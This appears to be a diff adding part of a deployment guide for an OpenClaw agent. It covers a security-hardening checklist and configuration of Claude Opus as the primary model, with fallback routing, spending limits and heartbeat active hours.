+- [ ] D2: Sandbox config applied (mode: all, scope: session, Docker verified)
+  - Docker memory impact observed: _______________
+  - Fallback needed (session -> agent -> off)? _______________
+- [ ] D3: exec-approvals.json created and permissions set to 600
+  - Notes: _______________
+- [ ] D4: Elevated mode disabled
+  - Notes: _______________
+- [ ] D5: mDNS disabled (config + environment variable + dns-sd verification)
+  - dns-sd result: _______________
+- [ ] D6: Tool policy applied (read-only day-1 posture)
+  - Notes: _______________
+- [ ] D7: Security audit passed (basic + deep + auto-fix)
+  - Basic audit result: _______________
+  - Deep audit result: _______________
+  - Auto-fix applied: _______________
+  - Unresolved findings: _______________
+- [ ] D8: File permissions locked down (700 directories, 600 files)
+  - Verification output: _______________
+- [ ] **Gateway restarted** after all config changes
+- [ ] **Open Question #3 noted** — monitor Docker memory during Phase G
+- [ ] **Open Question #5 noted** — test exec-approvals pattern matching during Phase H
+
+---
+
+## Phase E: Model Configuration
+
+**What we're doing:** Configuring Claude as the LLM provider with the right model, cost controls, and the foundations for model routing.
+**Why it matters:** The model choice directly affects both security and cost. Opus is recommended for prompt injection resistance. But API costs can surprise you — community reports of $20-50 on Day 1 are common.
+**Time estimate:** 10 minutes.
+**Deeper context:** `knowledge-base/02-architecture/deep-dive-findings.md` (Multi-Model Architecture section)
+
+### Understanding: How Model Routing Actually Works
+
+One of the things that surprised us during the Phase 2 architecture deep-dive: OpenClaw's model routing is **failover-based, not intelligent**. It does NOT automatically decide "this is a complex task, use Opus" or "this is a simple task, use Haiku." Instead, you assign a primary model to each agent, and if that model is unavailable (API error, rate limit), it falls through a fallback chain in order. That's it.
+
+This matters for two reasons. First, it means cost optimization is manual — if you want cheaper models for routine tasks, you create separate agents with different models and route messages to them using the bindings system. Second, it means the security recommendation is straightforward: use Claude Opus 4.6 as the primary for everything on Day 1. The official docs explicitly recommend Opus (or the latest flagship) for tool-enabled agents because it's the strongest at recognizing prompt injections. Smaller, cheaper models are "generally more susceptible to tool misuse and instruction hijacking." When an attacker embeds prompt injection in a web page or email, Opus is most likely to recognize it for what it is and refuse to comply.
+
+Cost-wise, expect the first day to be expensive. Community reports suggest 5-15M tokens on Day 1 due to the system prompt, skill loading, initial conversations, and heartbeat activity. At Opus pricing, budget $5-15 for Day 1. After you have usage data from the first week, you can optimize: use Sonnet for heartbeat checks, set active hours to prevent overnight token burn, and prune unused skills to reduce system prompt size.
+
+### E1: Verify API Key and Model Selection
+
+**Concept:** The API key was configured during onboarding (Phase C). This step verifies it's set correctly and the model is what we want.
+
+```bash
+# Check current model configuration
+openclaw config get agents.defaults.model
+# Expected: Should show Claude Opus 4.6 or equivalent
+
+# If you need to set it explicitly:
+openclaw config set agents.defaults.model "claude-opus-4-6-20250514"
+```
+
+**Expected output:** Model shows as Claude Opus 4.6.
+
+**If something's wrong:**
+- If the model is set to something else (Sonnet, Haiku): change it to Opus for Day 1. Cost optimization comes later.
+- If the API key is invalid: check the Anthropic console, generate a new key, and update via `openclaw config set`
+
+### E2: Model Routing — Day-1 Simplicity
+
+**Concept:** Day 1 is Opus for everything. No multi-model complexity. The Week 1-2 roadmap introduces cost optimization once you have usage data.
+
+For Day 1, the default configuration from onboarding is sufficient. No changes needed — just verify Opus is the primary model (E1 above).
+
+**Week 1-2 approach (when you're ready to optimize costs):**
+
+```json5
+// Per-agent model configuration
+{
+  "agents": {
+    "list": [
+      {
+        "id": "main",
+        "model": "claude-opus-4-6-20250514",      // Primary: Opus for complex/security-sensitive
+        "modelFallback": ["claude-sonnet-4-5-20250929"]  // Fallback if Opus unavailable
+      }
+    ]
+  }
+}
+```
+
+Later, you can create separate agents with cheaper models for heartbeat checks and routine cron jobs. But that's Week 2 — don't over-engineer Day 1.
+
+**Security note:** Do NOT set a weaker model as the primary for your main agent. Opus is recommended specifically for prompt injection resistance. Use Sonnet only for heartbeat, simple cron jobs, and webhook-triggered tasks where the input is controlled.
+
+### E3: Spending Limits and Cost Controls
+
+**Concept:** API costs can escalate quickly, especially in the first few days when you're actively testing. Setting spending limits is a safety net.
+
+**Step 1 — Set limits in the Anthropic Console:**
+
+Go to [console.anthropic.com](https://console.anthropic.com/) > Settings > Limits
+
+Recommended initial limits:
+- Daily: $10
+- Monthly: $100
+
+Adjust upward as you understand your usage patterns. Better to hit a limit and raise it than to wake up to a surprise bill.
+
+**Step 2 — Configure active hours for heartbeat:**
+
+```json5
+{
+  "agents": {
+    "defaults": {
+      "heartbeat": {
+        "activeHours": { "start": "08:00", "end": "22:00" }
+        // Heartbeat only runs during waking hours — no overnight token burn
+      }
+    }
+  }
+}
+```
+
+**Other cost reduction tips from the research:**
+- Disable skills you don't use (`entries.<key>.enabled: false`) — each active skill adds to the system prompt, which adds tokens per message
+- Use `allowBundled` whitelist to load only the skills you actually need (the 53 bundled skills cost ~1,300 tokens/turn if all are loaded)
+- Use Sonnet (cheaper) for heartbeat and routine cron jobs via per-cron model override
+- Monitor usage daily during the first week: [console.anthropic.com](https://console.anthropic.com/) > Usage
+
+**Expected output:** Spending limits set in the Anthropic console. Active hours configured in `openclaw.json`.
+
+### Phase E — Deployment Notes
+
+*Fill this in during deployment:*
+
+- [ ] Model confirmed as Opus?
+- [ ] Spending limits set? Daily: $___ Monthly: $___
+- [ ] Active hours configured?
+- [ ] Day 1 actual token usage: ___ tokens, $___
+- Notes / deviations / surprises:
+
+---
